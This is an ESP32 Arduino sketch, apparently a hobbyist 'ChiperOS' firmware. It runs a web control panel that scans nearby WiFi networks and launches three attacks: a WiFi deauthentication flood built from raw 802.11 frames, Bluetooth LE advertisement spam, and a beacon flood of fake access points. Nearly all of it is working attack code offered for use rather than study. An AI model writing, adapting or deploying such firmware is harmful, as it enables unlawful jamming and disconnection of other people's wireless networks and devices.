#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <Update.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <esp_random.h>

WebServer server(80);

const char* ssid = "ChiperOS";
const char* pass = "plusX123";
IPAddress ip(192, 100, 0, 1);

// === STATE ===
bool deauthRunning = false;
bool bleSpamRunning = false;
bool fakeAPRunning = false;

// === DEAUTH ===
uint8_t deauthFrame[26];
int targetChannel = 1;

// === BLE ===
unsigned long lastBlePacket = 0;

// === FAKE AP ===
String fakeAPNames[6] = {"LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO"};
int fakeAPCount = 6;
unsigned long lastFakeAPSend = 0;

// === SCAN ===
int scanCount = 0;
String scanSSIDs[20];
int scanChannels[20];

// === HTML ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>ChiperOS</title><style>
body{background:#0d1117;color:#58a6ff;font-family:monospace;padding:20px;text-align:center}
h1{color:#7ee787} .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin:10px 0}
.btn{padding:10px 20px;border:none;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold;color:#fff}
.btn-p{background:#238636} .btn-d{background:#da3633} .btn-w{background:#9e6a03} .btn-s{background:#3fb950;color:#000}
.net{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;margin:5px 0;cursor:pointer}
.net:hover{border-color:#58a6ff} .net.s{border-color:#3fb950;background:#1a2f1a}
.st{padding:10px;border-radius:5px;margin:10px 0} .st-on{background:#238636} .st-off{background:#30363d}
input{background:#0d1117;color:#fff;border:1px solid #30363d;padding:8px;border-radius:5px;margin:5px;width:100%}
</style></head><body><h1>🛡️ ChiperOS</h1>
<div class="card"><h2>📡 WiFi Scan</h2><button class="btn btn-p" onclick="scan()">🔍 Scan</button><div id="nets"></div></div>
<div class="card"><h2>📶 Deauth</h2><div id="dSt" class="st st-off">OFF</div><button class="btn btn-d" onclick="togD()">▶ Start</button></div>
<div class="card"><h2>🦷 BLE Spam</h2><div id="bSt" class="st st-off">OFF</div><button class="btn btn-w" onclick="togB()">▶ Start</button></div>
<div class="card"><h2>📡 Fake AP</h2><div id="fSt" class="st st-off">OFF</div><button class="btn btn-s" onclick="togF()">▶ Start</button></div>
<script>
let sel=0;
function scan(){fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('nets').innerHTML=d;});}
function togD(){fetch('/deauth?n='+sel).then(()=>{document.getElementById('dSt').className='st st-on';document.getElementById('dSt').innerText='ON';});}
function togB(){fetch('/ble').then(()=>{document.getElementById('bSt').className='st st-on';document.getElementById('bSt').innerText='ON';});}
function togF(){fetch('/fakeap').then(()=>{document.getElementById('fSt').className='st st-on';document.getElementById('fSt').innerText='ON';});}
setInterval(scan,5000);scan();
</script></body></html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  Serial.println("\n=== ChiperOS Boot ===");
  
  if (!LittleFS.begin(true)) Serial.println("FS Format");
  
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, pass);
  Serial.printf("AP: %s | IP: %s\n", ssid, ip.toString().c_str());
  
  // Deauth Frame Init
  deauthFrame[0] = 0xC0; deauthFrame[1] = 0x00;
  deauthFrame[2] = 0x3A; deauthFrame[3] = 0x01;
  memset(&deauthFrame[4], 0xFF, 6);
  deauthFrame[10] = 0xA2; deauthFrame[11] = 0xB4;
  deauthFrame[12] = 0xC5; deauthFrame[13] = 0xD6;
  deauthFrame[14] = 0xE7; deauthFrame[15] = 0xF3;
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);
  deauthFrame[24] = 0x02; deauthFrame[25] = 0x00;
  
  // Web Routes
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", html);
  });
  
  server.on("/scan", HTTP_GET, []() {
    scanCount = WiFi.scanNetworks();
    String h = "";
    for (int i = 0; i < scanCount && i < 20; i++) {
      h += "<div class='net' onclick='sel=" + String(i) + ";this.classList.add(\"s\")'><b>" + WiFi.SSID(i) + "</b><br>CH:" + String(WiFi.channel(i)) + "</div>";
      scanSSIDs[i] = WiFi.SSID(i);
      scanChannels[i] = WiFi.channel(i);
    }
    server.send(200, "text/html", h);
  });  
  server.on("/deauth", HTTP_GET, []() {
    int n = server.arg("n").toInt();
    if (n >= 0 && n < scanCount) {
      targetChannel = scanChannels[n];
      deauthRunning = true;
      esp_wifi_set_promiscuous(true);
      Serial.println("Deauth ON: " + scanSSIDs[n]);
    }
    server.send(200, "text/plain", "OK");
  });
  
  server.on("/ble", HTTP_GET, []() {
    bleSpamRunning = true;
    BLEDevice::init("ESP32-S3");
    Serial.println("BLE Spam ON");
    server.send(200, "text/plain", "OK");
  });
  
  server.on("/fakeap", HTTP_GET, []() {
    fakeAPRunning = true;
    esp_wifi_set_promiscuous(true);
    Serial.println("Fake AP ON");
    server.send(200, "text/plain", "OK");
  });
  
  server.begin();
  Serial.println("Server Ready");
}

void loop() {
  server.handleClient();
  
  // Deauth
  if (deauthRunning) {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    deauthFrame[22] = esp_random() & 0xFF;
    deauthFrame[23] = (esp_random() >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
    delay(100);
  }
  
  // BLE Spam
  if (bleSpamRunning) {
    if (millis() - lastBlePacket > 100) {
      lastBlePacket = millis();
      BLEAdvertising* p = BLEDevice::getAdvertising();
      p->stop();
      p->addServiceUUID(BLEUUID((uint16_t)(0x1800 + (esp_random() % 0x100))));
      p->setMinPreferred(0x06);      p->setMaxPreferred(0x12);
      p->start();
    }
  }
  
  // Fake AP
  if (fakeAPRunning) {
    if (millis() - lastFakeAPSend > 200) {
      lastFakeAPSend = millis();
      static int idx = 0;
      uint8_t beacon[128];
      memset(beacon, 0, 128);
      beacon[0] = 0x80; beacon[1] = 0x00;
      memset(&beacon[4], 0xFF, 6);
      beacon[10] = 0x02; beacon[11] = 0x00; beacon[12] = 0x00;
      beacon[13] = 0x00; beacon[14] = 0x00; beacon[15] = idx;
      memcpy(&beacon[16], &beacon[10], 6);
      uint64_t ts = millis() * 1000;
      memcpy(&beacon[24], &ts, 8);
      beacon[32] = 0xE8; beacon[33] = 0x03;
      beacon[34] = 0x01; beacon[35] = 0x00;
      int pos = 36;
      String ssidName = fakeAPNames[idx % fakeAPCount];
      beacon[pos++] = 0x00;
      beacon[pos++] = ssidName.length();
      memcpy(&beacon[pos], ssidName.c_str(), ssidName.length());
      pos += ssidName.length();
      beacon[pos++] = 0x01; beacon[pos++] = 0x08;
      beacon[pos++] = 0x82; beacon[pos++] = 0x84;
      beacon[pos++] = 0x8B; beacon[pos++] = 0x96;
      beacon[pos++] = 0x24; beacon[pos++] = 0x30;
      beacon[pos++] = 0x48; beacon[pos++] = 0x6C;
      esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
      idx = (idx + 1) % fakeAPCount;
    }
  }
  
  yield();
}
